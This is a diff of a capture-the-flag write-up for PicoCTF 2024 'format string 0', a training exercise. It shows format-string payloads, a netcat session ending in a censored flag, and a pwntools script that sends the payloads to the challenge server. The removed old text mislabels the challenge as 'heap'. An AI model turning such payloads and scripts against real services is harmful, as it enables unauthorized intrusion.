@@ -1,25 +1,40 @@
-# format string 0
+# format string 0 - PicoCTF 2024
 
-Level: Easy
+**Category:** Binary Exploitation  
+**Difficulty:** Easy  
+**Tags:** Format String, pwntools
 
-## Initial Thoughts
-This challenge is called heap, so right away I am thinking we are going to be working with the heap somehow.
+---
 
-This thought was solidified further after reading the description:
-```text
-Are overflows just a stack concern
-```
+## Challenge Description
 
-So we are likely not working with the stack, but rather the heap
+> Can you use your knowledge of format strings to make the customers happy?
+> 
+> Files provided:
+> - `format-string-0` (binary)
+> - `format-string-0.c` (source code)
+> - Remote instance: `nc mimas.picoctf.net <port>`
 
-As always, I launched the instance and saw three new things:
-1. The program source file: `format-string-0.c`
-2. The program binary file: `format-string-0`
-3. A server to connect to via netcat: `nc mimas.picoctf.net <port>`
+> <details>
+>   <summary>Hints</summary>
+>   This is an introduction of format string vulnerabilities. Look up "format specifiers" if you have never seen them before.
+>   Just try out the different options
+> </details>
 
-Right away, I checked out the source file and the binary.
+---
 
-First, the source file:
+## Initial Analysis
+
+Upon reading the description and reviewing the source code, it's clear that:
+
+- A Format String attack with be at play
+
+> Format String attacks are attacks where arbitrary code execution can occur, resulting in numerous vulnerabilities such as: RCE, buffer overflows, DoS, etc. This can occur when the printf() function does not handle its parameters appropriately.
+
+---
+
+## Source Code Analysis
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -124,18 +139,31 @@ void serve_bob() {
 }
 ```
 
-What's going on here? Well, it seems we are provided with three choices for three individuals to be served. I wonder what will happen if we try out the options...
+### Key Observations
+- There are two individuals we must serve
+- There are three options for us to choose from to serve each individual
+- There are constraints that will dictate which options we choose
+    - Patrick: `Gr%114d_Cheese` (passes since the printed characters exceed 64 bytes)
+    - Bob: `Cla%sic_Che%s%steak` (triggers the vulnerability since it is the only option with `%s`)
 
-Let's try it!
+---
 
-## Solving the Challenge
-After reading the code, we see the only options that fit the requirements are as follows:
-- Patrick: `Gr%114d_Cheese` (passes since the printed characters exceed 64 bytes)
-- Bob: `Cla%sic_Che%s%steak` (triggers the vulnerability since it is the only option with `%s`)
+## Static Binary Analysis
 
-Ok... this seems too straightforward... but let's try it:
+No binary analysis is necessary for this challenge.
 
-```sh
+---
+
+## Exploitation
+
+### Plan
+
+1. Submit the necessary food based on our previous analysis
+2. Receive the flag
+
+### Manual Exploitation
+
+```
 $ nc mimas.picoctf.net 49618
 Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
 Here comes the first customer Patrick who wants a giant bite.
@@ -150,4 +178,33 @@ ClaCla%sic_Che%s%steakic_Che(null)
 picoCTF{<censored>}
 ```
 
-Neat. this was our first example of a format string attack. Personally, I don't love this as a first introduction, but hopefully we will learn more later on!
+### Automated Exploitation with pwntools
+
+```python
+from pwn import *
+import sys
+
+if len(sys.argv) != 2:
+  print(f"Usage: {sys.argv[0]} <port>")
+  sys.exit(1)
+
+host = 'mimas.picoctf.net'
+port = int(sys.argv[1])
+
+conn = remote(host, port)
+
+# First customer (Patrick)
+conn.recvuntil(b"Enter your recommendation:")
+conn.sendline(b"Gr%114d_Cheese")
+
+# Second customer (Sponge Bob)
+conn.recvuntil(b"Enter your recommendation:")
+conn.sendline(b"Cla%sic_Che%s%steak")
+
+# Receive flag
+print(conn.recvall().decode())
+```
+
+## Key Takeaways
+- Format String attacks can be utilized to exploit a program in various ways
+- Binary analysis is not always necessary in a pwn challenges
